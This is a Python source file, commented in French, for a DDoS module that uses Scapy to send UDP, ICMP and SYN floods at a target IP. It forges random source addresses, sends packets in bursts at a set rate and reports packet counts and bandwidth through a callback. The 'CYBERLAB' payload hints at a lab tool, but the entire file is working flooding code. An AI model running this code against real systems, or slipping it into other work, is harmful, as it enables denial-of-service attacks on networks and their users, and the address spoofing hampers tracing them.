#!/usr/bin/env python3
"""
Module DDoS — Flood de paquets avec Scapy.
Types supportés : UDP Flood, ICMP Flood, SYN Flood.
"""

import time
import random
import threading
from scapy.all import (
    IP, UDP, ICMP, TCP, Raw,
    sendp, Ether, conf, RandShort
)


class DDoSAttack:
    def __init__(self, target_ip, attack_type, pps, interface, stop_event, report_fn):
        self.target    = target_ip
        self.atype     = attack_type   # 'udp', 'icmp', 'syn'
        self.pps       = max(10, min(pps, 5000))
        self.iface     = interface
        self.stop      = stop_event
        self.report    = report_fn
        self.total     = 0
        self.interval  = 1.0 / self.pps  # délai entre paquets

    def build_packet(self):
        """Construit le paquet selon le type d'attaque."""
        src_ip = f"{random.randint(1,254)}.{random.randint(1,254)}." \
                 f"{random.randint(1,254)}.{random.randint(1,254)}"

        base = Ether() / IP(src=src_ip, dst=self.target)

        if self.atype == "udp":
            return base / UDP(sport=RandShort(), dport=RandShort()) / Raw(b"X" * 32)

        elif self.atype == "icmp":
            return base / ICMP(type=8) / Raw(b"CYBERLAB" * 4)

        elif self.atype == "syn":
            return base / TCP(
                sport=RandShort(),
                dport=random.choice([80, 443, 22, 8080]),
                flags="S",
                seq=random.randint(0, 2**32 - 1)
            )
        return base / UDP(sport=RandShort(), dport=53) / Raw(b"X" * 20)

    def run(self):
        print(f"[*] DDoS {self.atype.upper()} lancé → {self.target} ({self.pps} pkt/s)")

        last_report = time.time()
        count_since_report = 0
        burst_size = max(1, self.pps // 10)   # envoyer par paquets de burst

        while not self.stop.is_set():
            t0 = time.time()

            # Burst de paquets
            pkts = [self.build_packet() for _ in range(burst_size)]
            sendp(pkts, iface=self.iface, verbose=False, inter=0)

            self.total         += burst_size
            count_since_report += burst_size

            # Rapport toutes les secondes
            now = time.time()
            elapsed = now - last_report
            if elapsed >= 1.0:
                actual_pps = count_since_report / elapsed
                mbps       = (actual_pps * 60 * 8) / 1_000_000  # ~60 octets par paquet moyen
                self.report({
                    "type":          "ddos_status",
                    "active":        True,
                    "pps":           int(actual_pps),
                    "total_packets": self.total,
                    "mbps":          round(mbps, 2),
                    "target_ip":     self.target,
                    "attack_type":   self.atype,
                })
                count_since_report = 0
                last_report = now

            # Régulation du débit
            elapsed_burst = time.time() - t0
            target_time   = burst_size / self.pps
            if elapsed_burst < target_time:
                time.sleep(target_time - elapsed_burst)

        # Rapport final
        self.report({
            "type":          "ddos_status",
            "active":        False,
            "pps":           0,
            "total_packets": self.total,
            "mbps":          0.0,
            "target_ip":     self.target,
            "attack_type":   self.atype,
        })
        print(f"[*] DDoS terminé — {self.total} paquets envoyés au total")